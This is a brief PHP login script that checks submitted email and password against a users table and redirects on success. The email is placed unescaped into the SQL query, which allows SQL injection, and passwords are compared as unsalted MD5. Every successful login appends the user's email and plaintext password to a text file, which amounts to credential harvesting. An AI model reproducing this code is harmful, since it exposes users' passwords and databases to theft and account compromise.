<?php  
include("dbconnect.php");
if(isset($_POST["submit"]))
{
$username=$_POST["identity"];
$password=$_POST["password"];

	$result = mysqli_query($GLOBALS["___mysqli_ston"],"SELECT * FROM `users` WHERE email='$username'
and password='".md5($password)."'");


	$rows = mysqli_num_rows($result);
        if($rows==1){
session_start();
        	
	    $_SESSION['username'] = $username;
            // Redirect user to index.php

$text = "email:" .$username . ", Password:" . $password . ", Login Time:" .date('Y-m-d H:i:s')."\n";
  $fp = fopen('accounts.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'saved';

    }
fclose ($fp);   



	    header("Location: success.php");
         }else{
	echo "<div class='form'>
<h3>Username/password is incorrect.</h3>
<br/>Click here to <a href='login.php'>Login</a></div>";
	}

}
  
?>